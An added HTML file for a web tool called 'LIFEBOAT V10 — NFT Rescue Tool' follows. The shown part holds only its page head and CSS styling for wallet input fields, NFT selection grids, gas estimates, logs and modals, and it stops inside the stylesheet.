@@ -1,0 +1,3055 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LIFEBOAT V10 — NFT Rescue Tool</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,400&family=Bebas+Neue&family=Syne:wght@700;800;900&display=swap');
+
+:root {
+  --bg:      #070e18;
+  --s1:      #0b1420;
+  --s2:      #101a28;
+  --s3:      #152030;
+  --s4:      #1a2838;
+  --border:  #1e2e42;
+  --border2: #2a3e58;
+  --border3: #3a5272;
+  --accent:  #f0d020;
+  --accent2: #00c896;
+  --accent3: #4499dd;
+  --danger:  #ff3c3c;
+  --warn:    #ff9500;
+  --safe:    #00e87a;
+  --text:    #e8f0f8;
+  --text2:   #a0b8d0;
+  --text3:   #5a7a9a;
+  --mono:    'DM Mono', monospace;
+  --display: 'Bebas Neue', sans-serif;
+  --head:    'Syne', sans-serif;
+  --radius: 2px;
+  --transition: 0.15s ease;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--mono);
+  min-height: 100vh;
+  line-height: 1.5;
+  overflow-x: hidden;
+}
+
+/* Grid texture */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(0,200,160,0.025) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,200,160,0.025) 1px, transparent 1px);
+  background-size: 48px 48px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,0.6) 100%);
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ── BACKGROUND LAYERS ── */
+.bg-scene {
+  position: fixed; inset: 0; z-index: 0; pointer-events: none;
+  background-size: cover; background-position: center;
+  transition: opacity 0.8s ease;
+}
+.bg-scene-rescue {
+  background-image: url('https://bwgytlvxlynxrtkj3rh3thgt3rv35alodtb3xgns2hs5kzegkpuq.ar.io/DY2JrrdeG3jNSdxPuZzT3Gu-gW4cw7uZstHl1WSGU-k/boat.png');
+  opacity: 0.14;
+}
+.bg-scene-lifeboat {
+  background-image: url('https://puc2sz45hfobiadhbrmbswxqsofs3xusxmein5lmpvvegzhrteuq.ar.io/fQWpZ505XBQAZwxYGVrwk4st3pK7CIb1bH1qQ2TxmSk/boat.png');
+  opacity: 0;
+}
+body.tab-lifeboat .bg-scene-rescue { opacity: 0; }
+body.tab-lifeboat .bg-scene-lifeboat { opacity: 0.18; }
+body.tab-rescue .bg-scene-rescue { opacity: 0.14; }
+body.tab-rescue .bg-scene-lifeboat { opacity: 0; }
+
+.bg-vignette {
+  position: fixed; inset: 0; z-index: 0; pointer-events: none;
+  background:
+    radial-gradient(ellipse at center, transparent 20%, rgba(6,12,20,0.82) 70%, rgba(6,12,20,0.98) 100%),
+    linear-gradient(to bottom, rgba(6,12,20,0.6) 0%, transparent 12%, transparent 88%, rgba(6,12,20,0.7) 100%);
+}
+
+/* ── SPLASH SCREEN ── */
+.splash {
+  position: fixed; inset: 0; z-index: 900;
+  overflow: hidden;
+  transition: opacity 0.9s ease, visibility 0.9s ease;
+}
+.splash.gone { opacity: 0; visibility: hidden; pointer-events: none; }
+
+.splash-bg {
+  position: absolute; inset: 0;
+  background-image: url('https://bwgytlvxlynxrtkj3rh3thgt3rv35alodtb3xgns2hs5kzegkpuq.ar.io/DY2JrrdeG3jNSdxPuZzT3Gu-gW4cw7uZstHl1WSGU-k/boat.png');
+  background-size: cover; background-position: center;
+  opacity: 0.35;
+  transition: opacity 1s ease;
+}
+.splash-bg.dimmed { opacity: 0.1; }
+
+.splash-vignette {
+  position: absolute; inset: 0;
+  background: radial-gradient(ellipse at center, rgba(6,12,20,0.25) 0%, rgba(6,12,20,0.88) 75%);
+  transition: background 1s ease;
+}
+.splash-vignette.dimmed {
+  background: radial-gradient(ellipse at center, rgba(6,12,20,0.7) 0%, rgba(6,12,20,0.97) 80%);
+}
+
+.splash-landing {
+  position: absolute; inset: 0;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  gap: 0; padding: 40px 24px;
+  transition: opacity 0.5s ease, transform 0.5s ease;
+}
+.splash-landing.hidden {
+  opacity: 0; transform: translateY(-20px); pointer-events: none;
+}
+
+.splash-seal {
+  width: 150px; height: 150px; object-fit: contain;
+  margin-bottom: 24px;
+  filter: drop-shadow(0 0 48px rgba(255,149,0,0.4)) drop-shadow(0 0 16px rgba(255,149,0,0.2));
+  animation: sealFloat 7s ease-in-out infinite;
+}
+@keyframes sealFloat { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-12px)} }
+
+.splash-first-btn {
+  font-family: var(--display);
+  font-size: 1.4rem; letter-spacing: 0.22em;
+  background: transparent;
+  border: 1px solid var(--accent);
+  color: var(--accent);
+  padding: 18px 60px;
+  cursor: pointer;
+  position: relative; overflow: hidden;
+  transition: color 0.25s ease, box-shadow 0.25s ease;
+}
+.splash-first-btn::before {
+  content: ''; position: absolute; inset: 0;
+  background: var(--accent);
+  transform: scaleX(0); transform-origin: left;
+  transition: transform 0.35s ease; z-index: -1;
+}
+.splash-first-btn:hover {
+  color: #060c14;
+  box-shadow: 0 0 60px rgba(240,208,32,0.25), 0 0 20px rgba(240,208,32,0.15);
+}
+.splash-first-btn:hover::before { transform: scaleX(1); }
+.splash-first-btn:active { transform: scale(0.98); }
+
+/* Message panel */
+.splash-msg-wrap {
+  position: absolute; inset: 0;
+  display: flex; align-items: center; justify-content: center;
+  overflow-y: auto; padding: 32px 20px;
+  opacity: 0; pointer-events: none;
+  transition: opacity 0.6s ease;
+}
+.splash-msg-wrap.visible { opacity: 1; pointer-events: all; }
+
+.splash-msg-inner {
+  width: 100%; max-width: 860px;
+  display: flex; flex-direction: column; gap: 0;
+  transform: translateY(20px);
+  transition: transform 0.6s ease;
+}
+.splash-msg-wrap.visible .splash-msg-inner { transform: none; }
+
+.splash-message {
+  background: rgba(6,12,20,0.82);
+  border: 1px solid var(--border2);
+  border-left: 3px solid var(--accent);
+  padding: 28px 36px;
+  margin-bottom: 20px;
+  display: flex; flex-direction: column; gap: 16px;
+  backdrop-filter: blur(12px);
+}
+
+.splash-graf {
+  font-size: 0.88rem; color: var(--text2); line-height: 1.95;
+}
+.splash-graf strong { color: var(--text); }
+.splash-graf em { color: var(--text); font-style: italic; }
+.splash-graf .green { color: var(--accent2); }
+.splash-graf .yellow { color: var(--accent); }
+
+.splash-av {
+  background: rgba(255,149,0,0.06);
+  border: 1px solid rgba(255,149,0,0.25);
+  border-radius: var(--radius);
+  padding: 14px 16px;
+  display: flex; gap: 12px; align-items: flex-start;
+  font-size: 0.67rem; color: var(--text2); line-height: 1.75;
+}
+.splash-av-icon { color: var(--warn); font-size: 1rem; flex-shrink: 0; margin-top: 2px; }
+.splash-av a { color: var(--accent3); text-decoration: none; }
+.splash-av a:hover { text-decoration: underline; }
+
+.splash-cta { display: flex; flex-direction: column; align-items: stretch; gap: 12px; }
+.splash-enter {
+  font-family: var(--display);
+  font-size: 1.2rem; letter-spacing: 0.2em;
+  background: transparent;
+  border: 1px solid var(--accent2);
+  color: var(--accent2);
+  padding: 16px 40px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+  position: relative; overflow: hidden;
+}
+.splash-enter::before {
+  content: ''; position: absolute; inset: 0;
+  background: var(--accent2);
+  transform: scaleX(0); transform-origin: left;
+  transition: transform 0.35s ease; z-index: -1;
+}
+.splash-enter:hover { color: #060c14; box-shadow: 0 0 40px rgba(0,200,150,0.2); }
+.splash-enter:hover::before { transform: scaleX(1); }
+.splash-enter:active { transform: scale(0.98); }
+.splash-note {
+  font-size: 0.54rem; color: var(--text3);
+  letter-spacing: 0.1em; text-align: center; line-height: 1.7;
+}
+
+/* ── APP SHELL ── */
+.app { position: relative; z-index: 1; display: flex; flex-direction: column; min-height: 100vh; }
+
+/* ── HEADER ── */
+.header {
+  background: rgba(6,8,9,0.97);
+  backdrop-filter: blur(16px);
+  border-bottom: 1px solid var(--border);
+  padding: 0 28px;
+  height: 68px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  position: sticky;
+  top: 0;
+  z-index: 200;
+  gap: 16px;
+}
+
+.logo { display: flex; align-items: baseline; gap: 12px; flex-shrink: 0; }
+
+.nav-bar { display: flex; align-items: center; gap: 4px; }
+.nav-btn {
+  font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em;
+  text-transform: uppercase; color: var(--text3); background: transparent;
+  border: none; padding: 6px 12px; cursor: pointer;
+  border-radius: var(--radius); transition: var(--transition);
+}
+.nav-btn:hover { color: var(--text2); background: rgba(255,255,255,0.03); }
+.nav-btn.active { color: var(--accent); }
+.nav-rescue.active { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 4px; }
+.nav-lifeboat.active { color: var(--accent2); border-bottom: 2px solid var(--accent2); padding-bottom: 4px; }
+.nav-faq.active { color: var(--text2); border-bottom: 2px solid var(--border3); padding-bottom: 4px; }
+
+.header-right { display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
+
+.status-pill {
+  display: flex; align-items: center; gap: 6px;
+  padding: 4px 10px; border: 1px solid var(--border2);
+  border-radius: 2px; font-size: 0.6rem;
+  letter-spacing: 0.15em; text-transform: uppercase; color: var(--text3);
+}
+.status-pill.active { border-color: var(--accent2); color: var(--accent2); }
+.status-dot { width: 5px; height: 5px; border-radius: 50%; background: currentColor; }
+.status-pill.active .status-dot { animation: pulse 2s infinite; }
+@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+.btn-fire {
+  background: rgba(255,60,60,0.08);
+  border: 1px solid rgba(255,60,60,0.25);
+  color: var(--danger);
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  padding: 7px 14px;
+  cursor: pointer;
+  letter-spacing: 0.1em;
+  transition: var(--transition);
+  border-radius: var(--radius);
+  display: flex; align-items: center; gap: 6px;
+}
+.btn-fire:hover { background: rgba(255,60,60,0.18); border-color: rgba(255,60,60,0.6); }
+.btn-fire:active { transform: scale(0.97); }
+
+/* ── PAGES ── */
+.page { display: none; }
+.page.active { display: block; }
+
+/* ── MAIN LAYOUT ── */
+.main-single { flex: 1; display: flex; flex-direction: column; }
+
+.panel-full {
+  flex: 1; display: flex; flex-direction: column;
+  max-width: 900px; width: 100%; margin: 0 auto; padding: 0 0 60px;
+}
+
+.panel-header {
+  padding: 20px 24px 16px;
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  position: sticky; top: 68px;
+  background: rgba(6,8,9,0.97);
+  backdrop-filter: blur(12px);
+  z-index: 100;
+}
+
+.panel-title { display: flex; align-items: center; gap: 10px; }
+.panel-label {
+  font-family: var(--display);
+  font-size: 1.15rem; font-weight: 900;
+  letter-spacing: 0.05em; text-transform: uppercase;
+}
+.panel-label.rescue { color: var(--accent); }
+.panel-label.lifeboat { color: var(--accent2); }
+.panel-number {
+  font-size: 0.62rem; letter-spacing: 0.16em; color: var(--text2);
+  border: 1px solid var(--border2); padding: 2px 8px; border-radius: 1px;
+}
+
+.panel-body { padding: 20px 24px; display: flex; flex-direction: column; gap: 16px; flex: 1; }
+
+/* ── FORMS ── */
+.field-group { display: flex; flex-direction: column; gap: 6px; }
+.field-label {
+  font-size: 0.65rem; letter-spacing: 0.18em;
+  text-transform: uppercase; color: var(--text2);
+  display: flex; align-items: center; gap: 8px;
+}
+.field-label .badge {
+  padding: 2px 6px; border-radius: 1px;
+  font-size: 0.56rem; letter-spacing: 0.08em;
+}
+.badge-danger { background: rgba(255,60,60,0.15); color: var(--danger); border: 1px solid rgba(255,60,60,0.25); }
+.badge-safe { background: rgba(0,232,122,0.1); color: var(--safe); border: 1px solid rgba(0,232,122,0.2); }
+.badge-warn { background: rgba(255,136,0,0.1); color: var(--warn); border: 1px solid rgba(255,136,0,0.2); }
+
+.field-input {
+  background: var(--s2);
+  border: 1px solid var(--border2);
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 0.78rem;
+  padding: 11px 14px;
+  width: 100%;
+  border-radius: var(--radius);
+  transition: var(--transition);
+  outline: none;
+}
+.field-input:focus { border-color: var(--border3); background: var(--s3); }
+.field-input.from-wallet:focus { border-color: rgba(255,60,60,0.4); }
+.field-input.to-wallet:focus { border-color: rgba(0,232,122,0.4); }
+.field-input.key-field { font-size: 0.7rem; letter-spacing: 0.04em; }
+.field-input::placeholder { color: var(--text3); }
+.field-input.has-value.from-wallet { border-color: rgba(255,60,60,0.3); }
+.field-input.has-value.to-wallet { border-color: rgba(0,232,122,0.3); }
+
+.field-hint { font-size: 0.64rem; color: var(--text2); margin-top: 4px; line-height: 1.5; }
+
+/* ── BUTTONS ── */
+.btn {
+  font-family: var(--mono);
+  font-size: 0.68rem;
+  letter-spacing: 0.12em;
+  padding: 10px 16px;
+  border: 1px solid;
+  border-radius: var(--radius);
+  cursor: pointer;
+  transition: var(--transition);
+  text-transform: uppercase;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 7px;
+  white-space: nowrap;
+}
+.btn:active { transform: scale(0.98); }
+.btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none; }
+
+.btn-primary {
+  background: rgba(232,255,0,0.08);
+  border-color: rgba(232,255,0,0.35);
+  color: var(--accent);
+}
+.btn-primary:hover:not(:disabled) {
+  background: rgba(232,255,0,0.15);
+  border-color: rgba(232,255,0,0.65);
+}
+
+.btn-green {
+  background: rgba(0,200,160,0.08);
+  border-color: rgba(0,200,160,0.35);
+  color: var(--accent2);
+}
+.btn-green:hover:not(:disabled) {
+  background: rgba(0,200,160,0.18);
+  border-color: rgba(0,200,160,0.65);
+}
+
+.btn-ghost {
+  background: transparent;
+  border-color: var(--border2);
+  color: var(--text2);
+}
+.btn-ghost:hover:not(:disabled) {
+  background: var(--s2);
+  border-color: var(--border3);
+  color: var(--text);
+}
+
+.btn-row { display: flex; gap: 8px; flex-wrap: wrap; }
+.btn-full { width: 100%; }
+
+/* ── CHAIN PILLS ── */
+.chain-grid { display: flex; flex-wrap: wrap; gap: 6px; }
+.chain-pill {
+  display: flex; align-items: center; gap: 5px;
+  padding: 5px 10px; border: 1px solid var(--border2);
+  border-radius: 2px; font-size: 0.6rem;
+  letter-spacing: 0.1em; text-transform: uppercase;
+  color: var(--text3); cursor: pointer;
+  transition: var(--transition);
+  background: var(--s1); white-space: nowrap;
+}
+.chain-pill:hover { border-color: var(--border3); color: var(--text2); }
+.chain-pill.active { border-color: var(--accent2); color: var(--accent2); background: rgba(0,200,160,0.06); }
+.chain-dot { width: 5px; height: 5px; border-radius: 50%; background: currentColor; }
+.chain-count {
+  background: rgba(0,200,160,0.15);
+  color: var(--accent2);
+  border-radius: 2px;
+  padding: 0 4px;
+  font-size: 0.5rem;
+}
+
+/* ── CHAIN SECTION ── */
+.chain-section { margin-bottom: 16px; animation: fadeIn 0.2s ease; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: none; } }
+
+.chain-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 0 8px;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 8px;
+}
+.chain-name {
+  font-family: var(--display);
+  font-size: 1.1rem;
+  font-weight: 800;
+  color: var(--text);
+}
+.chain-pill {
+  font-size: 0.52rem;
+  padding: 3px 8px;
+  border: 1px solid;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  border-radius: 2px;
+}
+.chain-tally {
+  font-size: 0.6rem;
+  color: var(--text3);
+  margin-left: auto;
+}
+
+/* ── COLLECTION GROUP ── */
+.coll-group { margin-bottom: 4px; }
+.coll-header {
+  background: var(--s1);
+  border: 1px solid var(--border);
+  padding: 10px 14px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  cursor: pointer;
+  transition: border-color 0.15s, background 0.15s;
+  user-select: none;
+}
+.coll-header:hover { border-color: var(--border2); background: var(--s2); }
+
+.coll-cb {
+  width: 18px; height: 18px;
+  border: 1px solid var(--border2);
+  border-radius: 2px;
+  flex-shrink: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+  cursor: pointer;
+  transition: all 0.12s;
+}
+.coll-cb:hover { border-color: var(--safe); }
+.coll-cb.all { background: var(--safe); border-color: var(--safe); color: var(--bg); }
+.coll-cb.partial { background: var(--s3); border-color: var(--text3); color: var(--text); }
+
+.coll-name {
+  font-size: 0.72rem;
+  font-weight: 500;
+  flex: 1;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  color: var(--text);
+}
+.type-badge {
+  font-size: 0.5rem;
+  padding: 2px 6px;
+  border: 1px solid;
+  letter-spacing: 0.08em;
+  flex-shrink: 0;
+  border-radius: 2px;
+}
+.type-721 { border-color: rgba(68,153,221,0.4); color: var(--accent3); }
+.type-1155 { border-color: rgba(0,200,150,0.4); color: var(--accent2); }
+.coll-count {
+  font-size: 0.6rem;
+  color: var(--text3);
+  flex-shrink: 0;
+}
+.coll-sel {
+  font-size: 0.6rem;
+  color: var(--safe);
+  min-width: 44px;
+  text-align: right;
+  flex-shrink: 0;
+}
+.caret {
+  color: var(--text3);
+  font-size: 0.55rem;
+  transition: transform 0.2s;
+  flex-shrink: 0;
+}
+.caret.open { transform: rotate(90deg); }
+
+/* ── NFT GRID ── */
+.nft-grid {
+  display: none;
+  gap: 8px;
+  padding: 8px;
+  background: var(--s2);
+  border: 1px solid var(--border);
+  border-top: none;
+}
+.nft-grid.open {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+}
+.nft-grid.open.gallery {
+  grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+  gap: 12px;
+}
+.nft-card {
+  background: var(--s1);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  overflow: hidden;
+  transition: var(--transition);
+  cursor: pointer;
+}
+.nft-card:hover { border-color: var(--border2); }
+.nft-card.selected { border-color: var(--accent2); background: rgba(0,200,160,0.04); }
+.nft-card.flagged { border-color: var(--warn); background: rgba(255,149,0,0.04); }
+
+.nft-img-wrap {
+  position: relative;
+  aspect-ratio: 1;
+  background: var(--s2);
+}
+.nft-img {
+  width: 100%; height: 100%;
+  object-fit: cover;
+}
+.nft-checkbox {
+  position: absolute;
+  top: 6px; left: 6px;
+  width: 18px; height: 18px;
+  background: var(--s2);
+  border: 1px solid var(--border2);
+  border-radius: 2px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 0.6rem;
+  color: var(--accent2);
+}
+.nft-card.selected .nft-checkbox { background: var(--accent2); color: var(--bg); }
+
+.nft-info {
+  padding: 8px 10px;
+  display: flex; flex-direction: column; gap: 2px;
+}
+.nft-name {
+  font-size: 0.6rem;
+  color: var(--text);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.nft-coll {
+  font-size: 0.5rem;
+  color: var(--text3);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+/* ── EMPTY STATE ── */
+.empty-state {
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  padding: 60px 24px;
+  border: 1px dashed var(--border2);
+  border-radius: var(--radius);
+  text-align: center;
+}
+.empty-icon { font-size: 2.5rem; margin-bottom: 16px; opacity: 0.4; }
+.empty-title { font-size: 0.85rem; color: var(--text); margin-bottom: 8px; }
+.empty-sub { font-size: 0.68rem; color: var(--text3); line-height: 1.7; }
+
+/* ── LOADING ── */
+.loading-state {
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  padding: 60px 24px;
+  gap: 16px;
+  font-size: 0.7rem;
+  color: var(--text2);
+}
+.loading-spinner {
+  width: 32px; height: 32px;
+  border: 2px solid var(--border2);
+  border-top-color: var(--accent2);
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ── INFO BOXES ── */
+.info-box {
+  display: flex; gap: 12px; align-items: flex-start;
+  padding: 14px 16px;
+  border-radius: var(--radius);
+  font-size: 0.68rem;
+  line-height: 1.7;
+}
+.info-box.info {
+  background: rgba(68,153,221,0.06);
+  border: 1px solid rgba(68,153,221,0.2);
+  color: var(--text2);
+}
+.info-box.warn {
+  background: rgba(255,149,0,0.06);
+  border: 1px solid rgba(255,149,0,0.2);
+  color: var(--text2);
+}
+.info-box.success {
+  background: rgba(0,232,122,0.06);
+  border: 1px solid rgba(0,232,122,0.2);
+  color: var(--text2);
+}
+.info-box.danger {
+  background: rgba(255,60,60,0.06);
+  border: 1px solid rgba(255,60,60,0.2);
+  color: var(--text2);
+}
+.info-box-icon { flex-shrink: 0; }
+
+/* ── LIFEBOAT TAB NAVIGATION ── */
+.lb-tabs {
+  display: flex; gap: 2px;
+  border-bottom: 1px solid var(--border);
+  padding: 0 24px;
+  background: var(--s1);
+}
+.lb-tab {
+  font-family: var(--mono);
+  font-size: 0.58rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--text3);
+  background: transparent;
+  border: none;
+  padding: 12px 16px;
+  cursor: pointer;
+  transition: var(--transition);
+  border-bottom: 2px solid transparent;
+  margin-bottom: -1px;
+}
+.lb-tab:hover { color: var(--text2); }
+.lb-tab.active { color: var(--accent2); border-bottom-color: var(--accent2); }
+
+.lb-tab-content { display: none; }
+.lb-tab-content.active { display: block; }
+
+/* ── TOOL CARDS ── */
+.tool-card {
+  background: var(--s1);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  overflow: hidden;
+}
+.tool-card-header {
+  padding: 14px 18px;
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 10px;
+  background: var(--s2);
+}
+.tool-card-icon { color: var(--accent2); }
+.tool-card-title { font-size: 0.72rem; color: var(--text); font-weight: 500; }
+.tool-card-desc { font-size: 0.6rem; color: var(--text3); margin-left: auto; }
+.tool-card-body { padding: 18px; display: flex; flex-direction: column; gap: 14px; }
+
+/* ── BALANCE CARD ── */
+.balance-card {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+  padding: 16px;
+  background: var(--s2);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+}
+.balance-item { display: flex; flex-direction: column; gap: 4px; }
+.balance-label {
+  font-size: 0.55rem;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+}
+.balance-label.from { color: var(--danger); }
+.balance-label.to { color: var(--safe); }
+.balance-value { font-size: 1rem; color: var(--text); font-weight: 500; }
+.balance-addr { font-size: 0.55rem; color: var(--text3); }
+
+/* ── GAS ESTIMATE CARD ── */
+.gas-card {
+  padding: 16px;
+  background: var(--s2);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+}
+.gas-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 6px 0;
+  font-size: 0.68rem;
+}
+.gas-row + .gas-row { border-top: 1px solid var(--border); }
+.gas-label { color: var(--text3); }
+.gas-value { color: var(--text); }
+.gas-value.highlight { color: var(--accent2); font-weight: 500; }
+
+/* ── EXECUTION LOG ── */
+.exec-log {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 12px 14px;
+  max-height: 300px;
+  overflow-y: auto;
+  font-size: 0.6rem;
+  line-height: 1.8;
+}
+.log-line { display: flex; gap: 10px; }
+.log-ts { color: var(--text3); flex-shrink: 0; }
+.log-dim { color: var(--text3); }
+.log-info { color: var(--accent3); }
+.log-ok { color: var(--safe); }
+.log-warn { color: var(--warn); }
+.log-error { color: var(--danger); }
+
+/* ── PROGRESS ── */
+.progress-wrap { padding: 20px 0; }
+.progress-steps {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 16px;
+}
+.progress-step {
+  display: flex; flex-direction: column;
+  align-items: center; gap: 6px;
+  flex: 1;
+}
+.progress-num {
+  width: 28px; height: 28px;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 0.6rem; font-weight: 500;
+  background: var(--s2);
+  border: 1px solid var(--border2);
+  color: var(--text3);
+}
+.progress-step.active .progress-num { border-color: var(--accent2); color: var(--accent2); }
+.progress-step.done .progress-num { background: var(--accent2); border-color: var(--accent2); color: var(--bg); }
+.progress-label { font-size: 0.55rem; color: var(--text3); text-transform: uppercase; letter-spacing: 0.1em; }
+.progress-step.active .progress-label { color: var(--accent2); }
+.progress-step.done .progress-label { color: var(--text2); }
+
+.progress-bar-wrap {
+  height: 4px;
+  background: var(--s2);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.progress-bar {
+  height: 100%;
+  background: var(--accent2);
+  width: 0%;
+  transition: width 0.3s ease;
+}
+
+/* ── MODAL ── */
+.modal-overlay {
+  position: fixed; inset: 0;
+  background: rgba(0,0,0,0.8);
+  display: none; align-items: center; justify-content: center;
+  z-index: 1000;
+  padding: 20px;
+}
+.modal-overlay.visible { display: flex; }
+.modal {
+  background: var(--s1);
+  border: 1px solid var(--border2);
+  border-radius: var(--radius);
+  max-width: 440px;
+  width: 100%;
+  padding: 28px;
+}
+.modal-icon {
+  font-size: 2rem;
+  text-align: center;
+  margin-bottom: 16px;
+}
+.modal-title {
+  font-family: var(--display);
+  font-size: 1.3rem;
+  letter-spacing: 0.08em;
+  text-align: center;
+  margin-bottom: 14px;
+  color: var(--text);
+}
+.modal-body {
+  font-size: 0.7rem;
+  color: var(--text2);
+  line-height: 1.8;
+  text-align: center;
+  margin-bottom: 24px;
+  white-space: pre-wrap;
+}
+.modal-actions {
+  display: flex;
+  gap: 10px;
+  justify-content: center;
+}
+
+/* ── FOOTER ── */
+.footer {
+  padding: 20px 28px;
+  border-top: 1px solid var(--border);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 0.6rem;
+  color: var(--text3);
+  background: var(--s1);
+}
+.footer-left { display: flex; gap: 16px; align-items: center; }
+.footer-link { color: var(--text2); text-decoration: none; }
+.footer-link:hover { color: var(--accent2); }
+.footer-coffee {
+  color: var(--accent);
+  text-decoration: none;
+  padding: 6px 12px;
+  border: 1px solid rgba(240,208,32,0.2);
+  border-radius: var(--radius);
+  transition: var(--transition);
+}
+/* ── KANE MODAL ── */
+.kane-overlay {
+  position: fixed; inset: 0; z-index: 800;
+  background: rgba(4,8,16,0.88);
+  display: none; align-items: center; justify-content: center;
+  padding: 24px;
+  backdrop-filter: blur(8px);
+}
+.kane-overlay.visible { display: flex; }
+.kane-modal {
+  background: var(--s1);
+  border: 1px solid var(--border2);
+  border-top: 3px solid var(--accent);
+  max-width: 560px; width: 100%;
+  max-height: 90vh; overflow-y: auto;
+  position: relative;
+}
+.kane-close {
+  position: absolute; top: 14px; right: 16px;
+  background: none; border: none; color: var(--text3);
+  font-size: 1.1rem; cursor: pointer; line-height: 1;
+}
+.kane-close:hover { color: var(--text); }
+.kane-hero {
+  display: flex; gap: 20px; align-items: flex-start;
+  padding: 28px 28px 20px;
+  border-bottom: 1px solid var(--border);
+}
+.kane-photo {
+  width: 90px; height: 90px;
+  border-radius: 50%;
+  object-fit: cover;
+  border: 2px solid var(--accent);
+  flex-shrink: 0;
+  filter: drop-shadow(0 0 12px rgba(240,208,32,0.2));
+}
+.kane-identity { flex: 1; }
+.kane-name {
+  font-family: var(--display);
+  font-size: 1.6rem; letter-spacing: 0.08em;
+  color: var(--text); margin-bottom: 4px;
+}
+.kane-handle {
+  font-size: 0.65rem; color: var(--accent2);
+  margin-bottom: 10px;
+}
+.kane-bio {
+  font-size: 0.72rem; color: var(--text2); line-height: 1.85;
+}
+.kane-bio a { color: var(--accent2); text-decoration: none; }
+.kane-bio a:hover { text-decoration: underline; }
+.kane-section {
+  padding: 20px 28px;
+  border-bottom: 1px solid var(--border);
+}
+.kane-section-title {
+  font-size: 0.6rem; letter-spacing: 0.2em;
+  color: var(--text3); text-transform: uppercase;
+  margin-bottom: 14px;
+}
+.kane-tip-row {
+  display: flex; align-items: center;
+  gap: 10px; margin-bottom: 10px;
+}
+.kane-tip-label {
+  font-size: 0.62rem; color: var(--text3);
+  width: 42px; flex-shrink: 0;
+}
+.kane-tip-addr {
+  font-size: 0.6rem; color: var(--text2);
+  background: var(--s2); border: 1px solid var(--border);
+  padding: 6px 10px; flex: 1;
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  font-family: var(--mono);
+}
+.kane-copy-btn {
+  background: none; border: 1px solid var(--border2);
+  color: var(--text3); font-size: 0.58rem;
+  font-family: var(--mono); padding: 5px 10px;
+  cursor: pointer; flex-shrink: 0; white-space: nowrap;
+  transition: var(--transition);
+}
+.kane-copy-btn:hover { color: var(--text); border-color: var(--accent2); }
+.kane-copy-btn.copied { color: var(--safe); border-color: var(--safe); }
+.kane-links {
+  display: flex; flex-wrap: wrap; gap: 8px;
+  padding: 20px 28px;
+}
+.kane-link-btn {
+  font-size: 0.62rem; font-family: var(--mono);
+  padding: 8px 14px; text-decoration: none;
+  border: 1px solid var(--border2); color: var(--text2);
+  transition: var(--transition);
+}
+.kane-link-btn:hover { color: var(--accent); border-color: var(--accent); }
+.kane-link-btn.primary {
+  background: var(--accent); color: var(--bg);
+  border-color: var(--accent); font-weight: 600;
+}
+.kane-link-btn.primary:hover { background: #d4b81c; }
+
+
+.export-row {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+  padding: 10px 12px;
+  background: var(--s1);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+}
+.export-label { font-size: 0.55rem; color: var(--text3); flex: 1; }
+
